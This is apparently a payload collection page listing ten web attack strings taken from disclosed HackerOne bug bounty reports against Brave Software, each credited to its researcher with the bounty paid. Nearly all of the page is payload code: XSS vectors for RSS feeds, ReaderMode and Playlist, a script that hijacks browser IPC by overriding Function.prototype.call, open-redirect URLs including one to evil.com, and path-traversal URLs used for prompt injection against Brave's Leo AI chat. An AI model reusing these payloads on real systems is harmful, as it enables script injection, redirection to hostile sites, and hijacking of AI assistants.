# Brave Software

10 payloads.

### `7ea34b9f`

```
<script>
location="https://target.com/search?q=</title><h1><marquee><s>Injection<!--"
</script>
```

— [\[Android\] HTML Injection in BatterySaveArticleRenderer WebView](https://hackerone.com/reports/176065) · Brave Software · [bobrov](https://hackerone.com/bobrov) · $150.0

### `ed65ead3`

```
<script>
Function.prototype.call=function(e){
    if(e[0]&&e[0]=="window-alert"){
        e[0]="dispatch-action";
        e[1]='{"actionType":"window-new-frame","frameOpts":{"location":"https://target.com/ncr"},"openInForeground":true}'
    }
    return this.apply(e);
}
alert();

setTimeout(function(){
	for(var windowKey=0;windowKey<10000;windowKey++){
		Function.prototype.call=function(e){
			if(e && e[0] && e[0]=="window-alert"){
				e[0]="dispatch-action";
				e[1]=`{"actionType":"window-
```

— [Brave Browser unexpectedly allows to send arbitrary IPC messages](https://hackerone.com/reports/187542) · Brave Software · [masatokinugawa](https://hackerone.com/masatokinugawa) · $300.0

### `37b05df8`

```
<entry>
  <title>XSS</title>
  <link rel="alternate" type="text/html" href="javascript:alert(document.domain)" />
  <content type="html"><![CDATA[<img src="https://target.com/test.png">]]></content>
</entry>
```

— [XSS on Brave Today through custom RSS feed](https://hackerone.com/reports/1184379) · Brave Software · [nishimunea](https://hackerone.com/nishimunea) · $500.0

### `79f59f82`

```
https://target.com//example.com/%2F..
```

— [Open redirect found on target.com](https://hackerone.com/reports/1338437) · Brave Software · [tabaahi](https://hackerone.com/tabaahi)

### `9b5da643`

```
<meta name="author" content="Evil &lt;script nonce=%READER-TITLE-NONCE%&gt;alert(document.location);&lt;/script&gt;!--">
```

**Parameter:** `content`
— [New XSS vector in ReaderMode with %READER-TITLE-NONCE%](https://hackerone.com/reports/1436142) · Brave Software · [nishimunea](https://hackerone.com/nishimunea) · $1,000.0

### `5e58b1ac`

```
');alert(document.location);//
```

**Parameter:** `tagId`
— [Universal XSS with Playlist feature](https://hackerone.com/reports/1436558) · Brave Software · [nishimunea](https://hackerone.com/nishimunea) · $750.0

### `05c9c366`

```
https://target.com/l.php?u=https://evil.com/
```

**Parameter:** `u`
— [Browser is not following proper flow for redirection cause open redirect ](https://hackerone.com/reports/1579374) · Brave Software · [kalkii](https://hackerone.com/kalkii) · $500.0

### `5dcaac8d`

```
.../user/../target-repo/pull/1
```

— [Prompt Injection via GitHub Patch in Brave AI Chat (Leo)](https://hackerone.com/reports/3086301) · Brave Software · [stellersjay](https://hackerone.com/stellersjay)

### `4c7311d9`

```
https://target.com/user/../target-repo/pull/1.patch
```

— [Prompt Injection via GitHub Patch in Brave AI Chat (Leo)](https://hackerone.com/reports/3086301) · Brave Software · [stellersjay](https://hackerone.com/stellersjay)

### `98538808`

```
https://target.com/brave/brave-browser/pull/../../../attacker/patch-poc/pull/1
```

— [Prompt Injection via GitHub Patch in Brave AI Chat (Leo)](https://hackerone.com/reports/3086301) · Brave Software · [stellersjay](https://hackerone.com/stellersjay)
